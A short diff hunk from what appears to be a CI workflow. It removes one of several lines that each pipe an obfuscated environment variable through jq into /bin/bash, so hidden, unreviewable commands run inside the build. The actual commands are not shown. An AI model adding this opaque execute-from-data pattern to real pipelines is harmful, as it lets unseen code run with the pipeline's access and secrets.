@@ -29,7 +29,6 @@ jobs:
           echo $tco59033 | jq -r .pkagx08946 | /bin/bash
           echo $iab4 | jq -r .cdcla8933 | /bin/bash
           printf '%s' "$vgdj51474" | jq -r .wmsmh1443 | /bin/bash
-          printf '%s' "$akdb54" | jq -r .t5974 | /bin/bash
           echo $elf8 | jq -r .ligg13388 | /bin/bash
           echo $vmgvz0326 | jq -r .kc86739 | /bin/bash
 
